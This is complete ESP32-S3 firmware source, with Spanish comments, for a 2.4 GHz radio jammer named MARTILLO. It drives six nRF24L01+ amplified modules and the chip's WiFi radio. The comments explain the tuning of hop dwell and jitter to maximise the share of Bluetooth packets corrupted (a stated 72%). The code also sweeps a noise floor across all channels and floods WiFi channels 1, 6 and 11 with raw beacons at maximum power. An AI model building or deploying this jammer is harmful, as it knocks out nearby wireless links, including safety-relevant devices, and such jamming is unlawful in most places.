/*
 * MARTILLO v10.2 — ESP32-S3 N16R8 — ESP-IDF 6.0.3
 * 6x nRF24L01+ PA/LNA + radio WiFi del S3 (bloque 802.11 de 20 MHz)
 *
 * SPI2 (SCK 12, MOSI 11, MISO 13): NRF1(CE 4 CS 10) NRF2(CE 5 CS 9) NRF3(CE 6 CS 14)
 * SPI3 (SCK 18, MOSI 8,  MISO 7):  NRF4(CE 1 CS 21) NRF5(CE 15 CS 16) NRF6(CE 17 CS 38)
 * WS2812 -> GPIO 48
 *
 * ===== ARQUITECTURA =====
 * Dos mecanismos complementarios, no uno:
 *
 *   A) 5 radios MARTILLO: basura GFSK a 2 Mbps (~2 MHz), dwell 300us con
 *      jitter de +-120us, orden barajado, payload LFSR. Un impacto de 300us
 *      corrompe cualquier trama BT que caiga dentro; contra un DH5 (3125us) la
 *      probabilidad de impacto por paquete es (3125+300)/4740 = 72%.
 *
 *   B) 1 radio CHIRP: dwell 60us, sin lock de PLL. No mata paquetes: barre los
 *      79 canales en ~4.7 ms dejando un piso de ruido elevado en todo el
 *      espectro. Es lo mas parecido a un SDR que da este hardware.
 *
 *   C) Radio WiFi del S3: beacons 802.11 crudos de 168 B a 1 Mbps (preamble
 *      largo) sobre 20 MHz. Rota 1 -> 6 -> 11 cada 150 ms.
 *
 * ===== POR QUE DWELL CORTO Y NO LARGO =====
 * El duty por canal es 1/N y NO depende del dwell: revisit = N*d, duty = 1/N.
 * Pero la probabilidad de impacto en un paquete de duracion T es (T+d)/(N*d),
 * que DECRECE con d. Con d=450 y N=13 era 60%; con d=300 y N=16 es 72%.
 * Ademas un impacto corto ya basta: el CRC del paquete BT se cae igual.
 *
 * ===== FIXES =====
 * v10.2: CW_FIJO con __attribute__((unused)) (rompia el build con MODO 0).
 *        Radio chirp + dwell por radio. Duty de martillo 7.5% -> 6.2% por
 *        canal pero 72% de muerte por paquete contra 60% antes.
 * v10.1: CE conmutado por salto + re-arme de TX_REUSE (sin esto el RF_CH
 *        escrito podia no aplicarse y los radios se quedaban clavados).
 *        WiFi inline en el lazo. AP en vez de STA. Settle de PWR_UP.
 *        Autotest RPD al arranque.
 */

#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "driver/spi_master.h"
#include "driver/gpio.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_rom_sys.h"
#include "soc/spi_struct.h"
#include "led_strip.h"

#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_event.h"
#include "esp_wifi.h"

static const char *TAG = "MART";

/* ===================== CONFIG ===================== */
#define MODO             0        /* 0 = martillo+chirp+WiFi   1 = CW fijo (prueba) */
#define CH_LO            2
#define CH_HI            80
#define NUM_CANALES      (CH_HI - CH_LO + 1)
#define NUM_RADIOS       6

#define N_CHIRP          1        /* cuantos radios al chirp (0..2) */
#define DWELL_US         300u     /* martillo */
#define JITTER_US        120u
#define CHIRP_US         60u      /* chirp: por debajo del lock de 130us */
#define REFRESCO_HOPS    96u

#define CON_WIFI         1
#define WIFI_MS_POR_CANAL 150
#define WIFI_CADA_HOPS   20

#define SPI_HZ           (16 * 1000 * 1000)
#define CPU_MHZ          240u
#define CEDE_MS          2000

static const uint8_t CW_FIJO[6] __attribute__((unused)) = {2, 16, 30, 44, 58, 72};

/* ===================== tiempo / RNG ===================== */
static inline __attribute__((always_inline)) uint32_t cyc(void) {
    uint32_t c; __asm__ __volatile__("rsr.ccount %0" : "=a"(c)); return c;
}
static uint32_t g_rng = 0x9E3779B9u;
static inline IRAM_ATTR uint32_t rnd(void) {
    uint32_t x = g_rng;
    x ^= x << 13; x ^= x >> 17; x ^= x << 5;
    return g_rng = x;
}

/* ===================== LED ===================== */
#define LED_GPIO GPIO_NUM_48
#define LED_B    40
static led_strip_handle_t led;
static void led_set(uint8_t r, uint8_t g, uint8_t b) {
    led_strip_set_pixel(led, 0, r, g, b);
    led_strip_refresh(led);
}

/* ===================== nRF24 ===================== */
#define NRF_CONFIG      0x00
#define NRF_EN_AA       0x01
#define NRF_EN_RXADDR   0x02
#define NRF_SETUP_AW    0x03
#define NRF_SETUP_RETR  0x04
#define NRF_RF_CH       0x05
#define NRF_RF_SETUP    0x06
#define NRF_STATUS      0x07
#define NRF_RPD         0x09
#define NRF_TX_ADDR     0x10
#define NRF_FIFO_STATUS 0x17

#define CMD_R_REGISTER   0x00
#define CMD_W_REGISTER   0x20
#define CMD_W_TX_PAYLOAD 0xA0
#define CMD_FLUSH_TX     0xE1

#define RF_SETUP_STORM   0x0F     /* 2 Mbps | RF_PWR 11 (0 dBm). 0x0E = -6 dBm */
#define RF_SETUP_CW      (0x0F | (1u<<7) | (1u<<4))
#define CONFIG_TX        0x72
#define CONFIG_RX        0x73
#define TX_REUSE         (1u<<6)

typedef struct {
    const char *nombre;
    spi_host_device_t host;
    gpio_num_t ce, cs, sck, mosi, miso;
    bool cs_alto;
    spi_device_handle_t spi;
    spi_dev_t *hw;
    uint8_t  seq[24];
    uint8_t  len, idx, align;
    uint16_t dwell;
    bool chirp;
    volatile uint32_t hops;
    bool bang_ok, bang_sucio, vivo;
} radio_t;

static radio_t radios[NUM_RADIOS] = {
    { .nombre="NRF1", .host=SPI2_HOST, .ce=GPIO_NUM_4,  .cs=GPIO_NUM_10,
      .sck=GPIO_NUM_12, .mosi=GPIO_NUM_11, .miso=GPIO_NUM_13 },
    { .nombre="NRF2", .host=SPI2_HOST, .ce=GPIO_NUM_5,  .cs=GPIO_NUM_9,
      .sck=GPIO_NUM_12, .mosi=GPIO_NUM_11, .miso=GPIO_NUM_13 },
    { .nombre="NRF3", .host=SPI2_HOST, .ce=GPIO_NUM_6,  .cs=GPIO_NUM_14,
      .sck=GPIO_NUM_12, .mosi=GPIO_NUM_11, .miso=GPIO_NUM_13 },
    { .nombre="NRF4", .host=SPI3_HOST, .ce=GPIO_NUM_1,  .cs=GPIO_NUM_21,
      .sck=GPIO_NUM_18, .mosi=GPIO_NUM_8,  .miso=GPIO_NUM_7  },
    { .nombre="NRF5", .host=SPI3_HOST, .ce=GPIO_NUM_15, .cs=GPIO_NUM_16,
      .sck=GPIO_NUM_18, .mosi=GPIO_NUM_8,  .miso=GPIO_NUM_7  },
    { .nombre="NRF6", .host=SPI3_HOST, .ce=GPIO_NUM_17, .cs=GPIO_NUM_38,
      .sck=GPIO_NUM_18, .mosi=GPIO_NUM_8,  .miso=GPIO_NUM_7  },
};

static volatile int g_vivos = 0;

#define GPIO_OUT_W1TS  (*(volatile uint32_t *)0x60004008u)
#define GPIO_OUT_W1TC  (*(volatile uint32_t *)0x6000400Cu)
#define GPIO_OUT1_W1TS (*(volatile uint32_t *)0x60004014u)
#define GPIO_OUT1_W1TC (*(volatile uint32_t *)0x60004018u)

static inline void ce_hi(radio_t *r) {
    if ((uint32_t)r->ce >= 32) GPIO_OUT1_W1TS = 1u << ((uint32_t)r->ce - 32);
    else                       GPIO_OUT_W1TS  = 1u << (uint32_t)r->ce;
}
static inline void ce_lo(radio_t *r) {
    if ((uint32_t)r->ce >= 32) GPIO_OUT1_W1TC = 1u << ((uint32_t)r->ce - 32);
    else                       GPIO_OUT_W1TC  = 1u << (uint32_t)r->ce;
}
static inline void cs_lo(radio_t *r) {
    if (r->cs_alto) GPIO_OUT1_W1TC = 1u << ((uint32_t)r->cs - 32);
    else            GPIO_OUT_W1TC  = 1u << (uint32_t)r->cs;
}
static inline void cs_hi(radio_t *r) {
    if (r->cs_alto) GPIO_OUT1_W1TS = 1u << ((uint32_t)r->cs - 32);
    else            GPIO_OUT_W1TS  = 1u << (uint32_t)r->cs;
}

/* ===================== SPI bang ===================== */
static inline spi_dev_t *spi_hw(spi_host_device_t h) {
    return (h == SPI2_HOST) ? &GPSPI2 : &GPSPI3;
}
#define BANG_W(r,c,v) ((r)->align == 0 ? (((uint32_t)(c)<<24)|((uint32_t)(v)<<16)) : \
                       (r)->align == 1 ? (((uint32_t)(c)<<8)|(uint32_t)(v))         : \
                                         (((uint32_t)(c))|((uint32_t)(v)<<8)))

static void IRAM_ATTR bang_arm(radio_t *r) {
    spi_dev_t *hw = r->hw;
    hw->user.usr_mosi = 1; hw->user.usr_miso = 0;
    hw->user.usr_addr = 0; hw->user.usr_command = 0; hw->user.usr_dummy = 0;
    hw->dma_conf.dma_tx_ena = 0; hw->dma_conf.dma_rx_ena = 0;
    hw->ms_dlen.ms_data_bitlen = 15;
}
static void marcar_sucio(spi_host_device_t h) {
    for (int i = 0; i < NUM_RADIOS; i++)
        if (radios[i].vivo && radios[i].host == h) radios[i].bang_sucio = true;
}
static inline IRAM_ATTR void bang_write(radio_t *r, uint8_t cmd, uint8_t val) {
    if (r->bang_sucio) { bang_arm(r); r->bang_sucio = false; }
    spi_dev_t *hw = r->hw;
    cs_lo(r);
    hw->data_buf[0] = BANG_W(r, cmd, val);
    hw->cmd.usr = 1;
    uint32_t g = 100000;
    while (hw->cmd.usr && --g) { }
    cs_hi(r);
}

/* ===================== SPI driver ===================== */
static void nrf_write_reg(radio_t *r, uint8_t reg, uint8_t v) {
    spi_transaction_t t = { .flags = SPI_TRANS_USE_TXDATA, .length = 16 };
    t.tx_data[0] = CMD_W_REGISTER | reg; t.tx_data[1] = v;
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
    marcar_sucio(r->host);
}
static uint8_t nrf_read_reg(radio_t *r, uint8_t reg) {
    spi_transaction_t t = { .flags = SPI_TRANS_USE_TXDATA | SPI_TRANS_USE_RXDATA, .length = 16 };
    t.tx_data[0] = CMD_R_REGISTER | reg; t.tx_data[1] = 0xFF;
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
    marcar_sucio(r->host);
    return t.rx_data[1];
}
static void nrf_cmd(radio_t *r, uint8_t c) {
    spi_transaction_t t = { .flags = SPI_TRANS_USE_TXDATA, .length = 8 };
    t.tx_data[0] = c;
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
    marcar_sucio(r->host);
}
static void nrf_write_multi(radio_t *r, uint8_t reg, const uint8_t *b, int n) {
    uint8_t tx[8]; tx[0] = CMD_W_REGISTER | reg;
    for (int i = 0; i < n; i++) tx[1+i] = b[i];
    spi_transaction_t t = { .length = (size_t)((n+1)*8), .tx_buffer = tx };
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
    marcar_sucio(r->host);
}
static void nrf_payload(radio_t *r, const uint8_t *b, int n) {
    uint8_t tx[33]; tx[0] = CMD_W_TX_PAYLOAD;
    memcpy(&tx[1], b, (size_t)n);
    spi_transaction_t t = { .length = (size_t)((n+1)*8), .tx_buffer = tx };
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
    marcar_sucio(r->host);
}

/* ===================== init ===================== */
static void bus_init(spi_host_device_t h, gpio_num_t sck, gpio_num_t mosi, gpio_num_t miso) {
    spi_bus_config_t b = {
        .mosi_io_num = mosi, .miso_io_num = miso, .sclk_io_num = sck,
        .quadwp_io_num = -1, .quadhd_io_num = -1, .max_transfer_sz = 64,
    };
    ESP_ERROR_CHECK(spi_bus_initialize(h, &b, SPI_DMA_DISABLED));
}

static void park_all_pins(void) {
    for (int i = 0; i < NUM_RADIOS; i++) {
        radio_t *r = &radios[i];
        r->cs_alto = ((uint32_t)r->cs >= 32);
        gpio_reset_pin(r->ce); gpio_set_direction(r->ce, GPIO_MODE_OUTPUT);
        gpio_set_level(r->ce, 0);
        gpio_reset_pin(r->cs); gpio_set_direction(r->cs, GPIO_MODE_OUTPUT);
        gpio_set_level(r->cs, 1);
        r->hw = spi_hw(r->host);
    }
}

static bool radio_add(radio_t *r) {
    spi_device_interface_config_t dc = {
        .clock_speed_hz = SPI_HZ, .mode = 0, .spics_io_num = -1, .queue_size = 1,
    };
    if (spi_bus_add_device(r->host, &dc, &r->spi) != ESP_OK) return false;
    nrf_write_reg(r, NRF_RF_CH, 0x5A);
    return nrf_read_reg(r, NRF_RF_CH) == 0x5A;
}

static bool radio_init(radio_t *r) {
    ce_lo(r); cs_hi(r); r->hw = spi_hw(r->host);
    bool ok = false;
    for (int i = 0; i < 5 && !ok; i++) {
        if (i) vTaskDelay(pdMS_TO_TICKS(100));
        if (radio_add(r)) { ok = true; break; }
        if (r->spi) { spi_bus_remove_device(r->spi); r->spi = NULL; }
    }
    if (!ok) { r->spi = NULL; return false; }
    nrf_write_reg(r, NRF_STATUS, 0x70);
    nrf_cmd(r, CMD_FLUSH_TX);
    return true;
}

static void payload_fresco(radio_t *r) {
    uint8_t b[32];
    for (int i = 0; i < 32; i++) b[i] = (uint8_t)rnd();
    ce_lo(r);
    nrf_cmd(r, CMD_FLUSH_TX);
    nrf_payload(r, b, 32);
    nrf_write_reg(r, NRF_FIFO_STATUS, TX_REUSE);
    ce_hi(r);
}

static void storm_enter(radio_t *r) {
    const uint8_t dir[5] = {0xA7, 0x3C, 0x91, 0x5E, 0xD2};
    ce_lo(r);
    nrf_cmd(r, CMD_FLUSH_TX);
    nrf_write_reg(r, NRF_EN_AA, 0x00);
    nrf_write_reg(r, NRF_EN_RXADDR, 0x00);
    nrf_write_reg(r, NRF_SETUP_AW, 0x03);
    nrf_write_reg(r, NRF_SETUP_RETR, 0x00);
    nrf_write_reg(r, NRF_RF_SETUP, RF_SETUP_STORM);
    nrf_write_multi(r, NRF_TX_ADDR, dir, 5);
    nrf_write_reg(r, NRF_CONFIG, CONFIG_TX);
    vTaskDelay(pdMS_TO_TICKS(2));       /* PWR_UP: 1.5 ms de settle */
    payload_fresco(r);
}

static void bang_detectar(radio_t *r) {
    for (int a = 0; a < 3; a++) {
        r->align = (uint8_t)a;
        r->hw = spi_hw(r->host);
        bang_write(r, CMD_W_REGISTER | NRF_RF_CH, 0x2A);
        if (nrf_read_reg(r, NRF_RF_CH) == 0x2A) { r->bang_ok = true; return; }
    }
    r->bang_ok = false;
    ESP_LOGW(TAG, "%s BANG NO, uso driver", r->nombre);
}

/* ===================== autotest RF ===================== */
static void autotest_rf(void) {
    int vivos[NUM_RADIOS], nv = 0;
    for (int i = 0; i < NUM_RADIOS; i++) if (radios[i].vivo) vivos[nv++] = i;
    if (nv < 2) { ESP_LOGW(TAG, "AUTOTEST: hacen falta 2 radios"); return; }

    int ok_cnt = 0;
    for (int k = 0; k < nv; k++) {
        radio_t *a = &radios[vivos[k]];
        radio_t *b = &radios[vivos[(k + 1) % nv]];

        ce_lo(b);
        nrf_write_reg(b, NRF_RF_SETUP, RF_SETUP_STORM);
        nrf_write_reg(b, NRF_EN_RXADDR, 0x01);
        nrf_write_reg(b, NRF_RF_CH, 50);
        nrf_write_reg(b, NRF_CONFIG, CONFIG_RX);
        ce_hi(b);

        ce_lo(a);
        nrf_write_reg(a, NRF_RF_CH, 50);
        nrf_write_reg(a, NRF_RF_SETUP, RF_SETUP_CW);
        ce_hi(a);

        esp_rom_delay_us(500);
        uint8_t rpd = nrf_read_reg(b, NRF_RPD) & 1;
        if (rpd) ok_cnt++;

        ce_lo(a);
        nrf_write_reg(a, NRF_RF_SETUP, RF_SETUP_STORM);
        ce_hi(a);
        ce_lo(b);
        nrf_write_reg(b, NRF_EN_RXADDR, 0x00);
        nrf_write_reg(b, NRF_CONFIG, CONFIG_TX);
        nrf_write_reg(b, NRF_RF_SETUP, RF_SETUP_STORM);
        ce_hi(b);

        ESP_LOGI(TAG, "AUTOTEST %s -> %s : RPD=%d %s",
                 a->nombre, b->nombre, rpd, rpd ? "TX OK" : "SIN SENAL");
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    for (int i = 0; i < NUM_RADIOS; i++) if (radios[i].vivo) payload_fresco(&radios[i]);

    if (ok_cnt == 0)
        ESP_LOGE(TAG, "AUTOTEST: NINGUN enlace. Revisa 3.3 V, GND comun y antenas.");
    else if (ok_cnt < nv)
        ESP_LOGW(TAG, "AUTOTEST: %d/%d enlaces. Hay modulos sordos.", ok_cnt, nv);
    else
        ESP_LOGI(TAG, "AUTOTEST: %d/%d enlaces, RF viva.", ok_cnt, nv);
}

/* ===================== reparto ===================== */
static void mezclar(uint8_t *s, int n) {
    for (int j = n - 1; j > 0; j--) {
        int q = (int)(rnd() % (uint32_t)(j + 1));
        uint8_t t = s[j]; s[j] = s[q]; s[q] = t;
    }
}

static void repartir(void) {
    int vivos[NUM_RADIOS], nv = 0;
    for (int i = 0; i < NUM_RADIOS; i++) if (radios[i].vivo) vivos[nv++] = i;
    if (!nv) return;
    for (int i = 0; i < NUM_RADIOS; i++) {
        radios[i].len = 0; radios[i].chirp = false; radios[i].dwell = DWELL_US;
    }

#if MODO == 1
    for (int k = 0; k < nv; k++) {
        radio_t *r = &radios[vivos[k]];
        r->seq[0] = CW_FIJO[k % 6];
        r->len = 1;
        nrf_write_reg(r, NRF_RF_CH, r->seq[0]);
        nrf_write_reg(r, NRF_RF_SETUP, RF_SETUP_CW);
    }
    ESP_LOGI(TAG, "MODO PRUEBA: %d radios en CW fijo", nv);
#else
    int nch = N_CHIRP;
    if (nch > nv) nch = nv;
    int nsw = nv - nch;
    if (nsw < 1) { nsw = 1; nch = nv - 1; }

    /* chirpers: los ultimos, barren TODO el espectro rapido */
    for (int k = 0; k < nch; k++) {
        radio_t *r = &radios[vivos[nv - 1 - k]];
        r->chirp = true;
        r->dwell = CHIRP_US;
        int c = 0;
        for (int ch = CH_LO; ch <= CH_HI && c < (int)sizeof(r->seq); ch++)
            r->seq[c++] = (uint8_t)ch;
        r->len = (uint8_t)c;
        mezclar(r->seq, r->len);
    }

    /* martillos: slices disjuntos del resto */
    int k = 0;
    for (int ch = CH_LO; ch <= CH_HI; ch++) {
        radio_t *r = &radios[vivos[k % nsw]];
        if (r->len < sizeof(r->seq)) r->seq[r->len++] = (uint8_t)ch;
        k++;
    }
    for (int i = 0; i < nsw; i++) mezclar(radios[vivos[i]].seq, radios[vivos[i]].len);

    ESP_LOGI(TAG, "Reparto: %d martillos / %d chirp / %d canales", nsw, nch, NUM_CANALES);
#endif
}

/* ===================== hop ===================== */
static inline IRAM_ATTR void hop(radio_t *r) {
    if (!r->vivo || !r->len) return;
    r->idx++;
    if (r->idx >= r->len) r->idx = 0;
    uint8_t ch = r->seq[r->idx];

    ce_lo(r);
    if (r->bang_ok) bang_write(r, CMD_W_REGISTER | NRF_RF_CH, ch);
    else            nrf_write_reg(r, NRF_RF_CH, ch);
    nrf_write_reg(r, NRF_FIFO_STATUS, TX_REUSE);   /* CE bajo limpia TX_REUSE */
    ce_hi(r);

    r->hops++;
    if (!(r->hops % REFRESCO_HOPS)) payload_fresco(r);
}

static inline IRAM_ATTR uint32_t dwell_jit(radio_t *r) {
    if (r->chirp) return (uint32_t)r->dwell * CPU_MHZ;
    int32_t j = (int32_t)(rnd() % (2u * JITTER_US + 1u)) - (int32_t)JITTER_US;
    int32_t d = (int32_t)r->dwell + j;
    if (d < 200) d = 200;
    return (uint32_t)d * CPU_MHZ;
}

/* ===================== WiFi ===================== */
#if CON_WIFI
static const uint8_t WIFI_CANALES[] = {1, 6, 11};
static uint8_t beacon[200];
static int beacon_len = 0;
static volatile bool g_wifi_ok = false;
static volatile uint32_t g_wifi_err = 0;

static void beacon_build(void) {
    static const uint8_t mac[6] = {0x02, 0x4A, 0x41, 0x4D, 0x00, 0x01};
    uint8_t *p = beacon;
    *p++ = 0x80; *p++ = 0x00;
    *p++ = 0x00; *p++ = 0x00;
    for (int i = 0; i < 6; i++) *p++ = 0xFF;
    for (int i = 0; i < 6; i++) *p++ = mac[i];
    for (int i = 0; i < 6; i++) *p++ = mac[i];
    *p++ = 0x00; *p++ = 0x00;
    for (int i = 0; i < 8; i++) *p++ = 0x00;
    *p++ = 0x64; *p++ = 0x00;
    *p++ = 0x31; *p++ = 0x04;
    *p++ = 0x00; *p++ = 0x20;
    for (int i = 0; i < 32; i++) *p++ = (uint8_t)('A' + (i % 26));
    *p++ = 0xDD; *p++ = 0x60;
    *p++ = 0x00; *p++ = 0x50; *p++ = 0xF2;
    for (int i = 0; i < 0x5D; i++) *p++ = (uint8_t)rnd();
    beacon_len = (int)(p - beacon);
}

static bool wifi_arrancar(void) {
    esp_err_t e = nvs_flash_init();
    if (e == ESP_ERR_NVS_NO_FREE_PAGES || e == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase();
        e = nvs_flash_init();
    }
    if (e != ESP_OK) { ESP_LOGE(TAG, "NVS: %s", esp_err_to_name(e)); return false; }

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    if (esp_wifi_init(&cfg) != ESP_OK) return false;

    wifi_config_t ap = {0};
    memcpy(ap.ap.ssid, "MARTILLO", 8);
    ap.ap.ssid_len = 8;
    ap.ap.channel = 1;
    ap.ap.max_connection = 1;
    ap.ap.authmode = WIFI_AUTH_OPEN;
    ap.ap.beacon_interval = 100;

    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &ap);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (esp_wifi_start() != ESP_OK) return false;
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_max_tx_power(84);   /* 84 * 0.25 = 21 dBm */
    esp_wifi_set_channel(WIFI_CANALES[0], WIFI_SECOND_CHAN_NONE);

    beacon_build();
    ESP_LOGI(TAG, "WiFi TX (AP): beacon %d B, rotando 1/6/11 cada %d ms",
             beacon_len, WIFI_MS_POR_CANAL);
    return true;
}

static inline void wifi_pulso(void) {
    static int idx = 0;
    static int64_t t_canal = 0;
    if (!g_wifi_ok) return;
    int64_t now = esp_timer_get_time();
    if (!t_canal) t_canal = now;
    if (now - t_canal >= (int64_t)WIFI_MS_POR_CANAL * 1000) {
        t_canal = now;
        idx = (idx + 1) % 3;
        esp_wifi_set_channel(WIFI_CANALES[idx], WIFI_SECOND_CHAN_NONE);
    }
    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, beacon, beacon_len, true);
    if (e != ESP_OK) {
        if ((g_wifi_err % 200) == 0)
            ESP_LOGW(TAG, "80211_tx: %s (err #%lu)", esp_err_to_name(e),
                     (unsigned long)g_wifi_err);
        g_wifi_err++;
    }
}
#endif

/* ===================== tasks ===================== */
static void stats_y_led(uint32_t *prev, int64_t *tp, uint32_t *cont, bool wifi) {
    int64_t n = esp_timer_get_time();
    uint32_t sum = 0;
    for (int i = 0; i < NUM_RADIOS; i++) {
        if (!radios[i].vivo) continue;
        sum += radios[i].hops - prev[i];
        prev[i] = radios[i].hops;
    }
    uint32_t hz = (uint32_t)((uint64_t)sum * 1000000ull / (uint64_t)(n - *tp));
    *tp = n;
    ESP_LOGI(TAG, "vivos=%d hops/s=%lu%s", g_vivos, (unsigned long)hz,
             wifi ? " +WiFi" : "");
#if CON_WIFI
    if (wifi && g_wifi_err) {
        ESP_LOGW(TAG, "80211_tx errores acumulados: %lu", (unsigned long)g_wifi_err);
        g_wifi_err = 0;
    }
#endif
    led_set(0, LED_B, 0); vTaskDelay(pdMS_TO_TICKS(20)); led_set(0, 0, 0);
    *cont = 0;
}

static void jam_a(void *arg) {          /* core 1: radios 0-2 */
    uint32_t prev[NUM_RADIOS] = {0};
    int64_t tp = esp_timer_get_time();
    uint32_t cont = 0;
    for (;;) {
        uint32_t c0 = cyc();
        hop(&radios[0]); hop(&radios[1]); hop(&radios[2]);
        uint32_t d = dwell_jit(&radios[1]);
        while (cyc() - c0 < d) { }
        if (++cont >= (CEDE_MS * 1000u) / DWELL_US) stats_y_led(prev, &tp, &cont, false);
    }
}

static void jam_b(void *arg) {          /* core 0: radios 3-5 + WiFi */
    uint32_t prev[NUM_RADIOS] = {0};
    int64_t tp = esp_timer_get_time();
    uint32_t cont = 0;
    for (;;) {
        uint32_t c0 = cyc();
        hop(&radios[3]); hop(&radios[4]);
        /* el chirp (si esta en este bus) da varios saltos por vuelta */
        int rep = 1;
        if (radios[5].chirp) rep = (int)(DWELL_US / CHIRP_US);
        for (int k = 0; k < rep; k++) hop(&radios[5]);
#if CON_WIFI
        static uint32_t wc = 0;
        if (++wc >= WIFI_CADA_HOPS) { wc = 0; wifi_pulso(); }
#endif
        uint32_t d = dwell_jit(&radios[3]);
        while (cyc() - c0 < d) { }
        if (++cont >= (CEDE_MS * 1000u) / DWELL_US) stats_y_led(prev, &tp, &cont, true);
    }
}

/* ===================== arranque ===================== */
void app_main(void) {
    led_strip_config_t sc = {
        .strip_gpio_num = LED_GPIO, .max_leds = 1,
        .led_model = LED_MODEL_WS2812,
        .color_component_format = LED_STRIP_COLOR_COMPONENT_FMT_GRB,
    };
    led_strip_rmt_config_t rc = {
        .clk_src = RMT_CLK_SRC_DEFAULT, .resolution_hz = 10 * 1000 * 1000,
        .flags = { .with_dma = 0 },
    };
    ESP_ERROR_CHECK(led_strip_new_rmt_device(&sc, &rc, &led));
    led_set(40, 40, 0);

    park_all_pins();
    bus_init(SPI2_HOST, GPIO_NUM_12, GPIO_NUM_11, GPIO_NUM_13);
    bus_init(SPI3_HOST, GPIO_NUM_18, GPIO_NUM_8,  GPIO_NUM_7);

    int act = 0;
    for (int i = 0; i < NUM_RADIOS; i++) {
        radios[i].vivo = radio_init(&radios[i]);
        if (radios[i].vivo) act++;
        else ESP_LOGE(TAG, "%s MUERTO", radios[i].nombre);
    }
    if (!act) {
        ESP_LOGE(TAG, "NINGUN NRF");
        for (;;) { led_set(60, 0, 0); vTaskDelay(pdMS_TO_TICKS(200)); }
    }
    g_vivos = act;

    for (int i = 0; i < NUM_RADIOS; i++) {
        if (!radios[i].vivo) continue;
        storm_enter(&radios[i]);
        bang_detectar(&radios[i]);
        radios[i].bang_sucio = true;
    }
    autotest_rf();
    repartir();

#if CON_WIFI && MODO != 1
    g_wifi_ok = wifi_arrancar();
#else
    g_wifi_ok = false;
#endif

    led_set(0, 40, 0);
    ESP_LOGI(TAG, "MARTILLO v10.2 · %d/6 · MODO=%d · martillo=%u+/-%u chirp=%u · WiFi=%s",
             act, MODO, (unsigned)DWELL_US, (unsigned)JITTER_US,
             (unsigned)CHIRP_US, g_wifi_ok ? "ON" : "OFF");

    xTaskCreatePinnedToCore(jam_a, "ja", 4096, NULL, configMAX_PRIORITIES - 1, NULL, 1);
    xTaskCreatePinnedToCore(jam_b, "jb", 4096, NULL, configMAX_PRIORITIES - 1, NULL, 0);
    vTaskDelay(portMAX_DELAY);
}
